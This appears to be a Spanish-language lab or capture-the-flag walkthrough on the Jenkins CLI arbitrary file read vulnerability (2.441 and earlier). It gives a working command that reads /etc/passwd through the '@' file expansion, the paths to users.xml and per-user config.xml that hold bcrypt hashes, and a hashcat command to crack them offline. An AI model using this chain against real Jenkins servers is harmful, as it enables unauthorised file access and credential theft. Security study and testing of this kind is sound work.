**Jenkins LFI Vulnerability (2024)**

游뚿 **Este ataque permite la lectura de archivos arbitrarios desde el sistema de archivos del servidor Jenkins si la vulnerabilidad est치 presente.** 游뚿

Jenkins es un servidor open source utilizado principalmente para la integraci칩n continua. Facilita la automatizaci칩n de las tareas de desarrollo de software, permitiendo la entrega continua y la compilaci칩n de proyectos de forma eficiente. Si bien es una herramienta ampliamente usada, ciertos errores de configuraci칩n en versiones anteriores pueden ser aprovechados para obtener acceso no autorizado a archivos del sistema.

En versiones de Jenkins como 2.441 y anteriores (LTS 2.426.2 y anteriores), existe una vulnerabilidad que afecta al comando de an치lisis de archivos, permitiendo que un atacante no autenticado lea archivos arbitrarios del sistema de archivos de Jenkins al enviar una ruta maliciosa. Este comportamiento ocurre debido a que el analizador de comandos CLI no desactiva la funci칩n que reemplaza un car치cter '@' seguido de una ruta de archivo con el contenido del archivo en cuesti칩n.

**Proof of Concept (PoC):**

Para explotar esta vulnerabilidad, primero se utiliza el siguiente comando:
```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/etc/passwd 2>&1 | grep -oP "'.*?'"
```

Este comando permite obtener el contenido de archivos del sistema al inyectar la ruta de un archivo en un par치metro del comando.

**Acceder a contrase침as cifradas:**

Una vez que tenemos acceso al sistema de archivos, podemos buscar archivos que contienen contrase침as cifradas. En el caso de Jenkins, la ruta donde se almacenan los archivos de configuraci칩n de los usuarios, incluida la contrase침a cifrada, es din치mica. 

La ruta del archivo `users.xml` es com칰n, y dentro de 칠l, se encuentra la referencia a los archivos de configuraci칩n individuales de cada usuario:
```
/var/jenkins_home/users/users.xml
```

Con la informaci칩n de `users.xml`, podemos ubicar el archivo de configuraci칩n de un usuario espec칤fico, que generalmente tendr치 la siguiente ruta:
```
/var/jenkins_home/users/userrandom_12108429903186576833/config.xml
```

Dentro de este archivo, podemos encontrar la contrase침a cifrada del usuario, generalmente en formato bcrypt.

**Cracking de la contrase침a:**

El siguiente paso ser칤a intentar crackear la contrase침a utilizando herramientas como Hashcat. Dado que el identificador para bcrypt es **3200**, se puede utilizar el siguiente comando en Hashcat para intentar recuperar la contrase침a en texto claro:
```
hashcat -m 3200 -a 0 <hashed_password_file> <wordlist>
```

Este ataque puede realizarse de forma offline, lo que hace que el proceso sea m치s seguro y menos detectable.
